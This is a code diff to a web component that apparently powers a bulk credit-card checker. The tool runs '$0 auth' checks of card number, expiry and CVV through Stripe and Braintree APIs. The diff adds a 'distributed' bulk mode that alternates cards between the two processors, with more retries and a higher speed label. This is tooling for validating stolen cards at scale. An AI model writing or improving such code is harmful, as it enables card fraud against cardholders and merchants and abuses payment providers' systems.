@@ -148,9 +148,9 @@ const gateways: Gateway[] = [
     type: "auth",
     status: "online", 
     cardTypes: "Visa/MC/Amex/Discover",
-    speed: "⚡ Blazing",
+    speed: "⚡⚡ Ultra",
     successRate: "99%",
-    description: "$0 Auth Check • Dual API (Stripe + B3) • CVC optional",
+    description: "$0 Auth Check • Parallel API (Stripe ↔ B3) • CVC optional",
     icon: Zap,
     iconColor: "text-indigo-500"
   },
@@ -827,7 +827,7 @@ const Gateways = () => {
     };
   };
 
-  // Combined Auth API check (YUNCHI AUTH 2) - uses both Stripe + B3 APIs in parallel
+  // Combined Auth API check (YUNCHI AUTH 2) - uses both Stripe + B3 APIs in parallel for single card
   const checkCardViaCombined = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 3): Promise<GatewayApiResponse> => {
     const cc = `${cardNumber}|${month}|${year}|${cvv}`;
     
@@ -905,6 +905,17 @@ const Gateways = () => {
       apiMessage: "Max retries exceeded",
       rawResponse: "Max retries exceeded"
     };
+  };
+
+  // Parallel distributed check for bulk mode - sends card to specific API (stripe or b3)
+  const checkCardViaDistributed = async (cardNumber: string, month: string, year: string, cvv: string, targetApi: 'stripe' | 'b3', maxRetries = 5): Promise<GatewayApiResponse> => {
+    if (targetApi === 'stripe') {
+      const result = await checkCardViaApi(cardNumber, month, year, cvv, maxRetries);
+      return { ...result, usedGateway: 'stripe' };
+    } else {
+      const result = await checkCardViaB3(cardNumber, month, year, cvv, maxRetries);
+      return { ...result, usedGateway: 'b3' };
+    }
   };
 
   // Fallback simulation for non-API gateways
@@ -1684,7 +1695,9 @@ const Gateways = () => {
         if (selectedGateway.id === "stripe_auth") {
           gatewayResponse = await checkCardViaApi(cardData.card, cardData.month, cardData.year, cardData.cvv);
         } else if (selectedGateway.id === "combined_auth") {
-          gatewayResponse = await checkCardViaCombined(cardData.card, cardData.month, cardData.year, cardData.cvv);
+          // Parallel distributed processing: alternate cards between Stripe (even) and B3 (odd)
+          const targetApi: 'stripe' | 'b3' = cardIndex % 2 === 0 ? 'stripe' : 'b3';
+          gatewayResponse = await checkCardViaDistributed(cardData.card, cardData.month, cardData.year, cardData.cvv, targetApi);
         } else if (selectedGateway.id === "braintree_auth") {
           gatewayResponse = await checkCardViaB3(cardData.card, cardData.month, cardData.year, cardData.cvv);
         } else if (selectedGateway.id === "paygate_charge") {
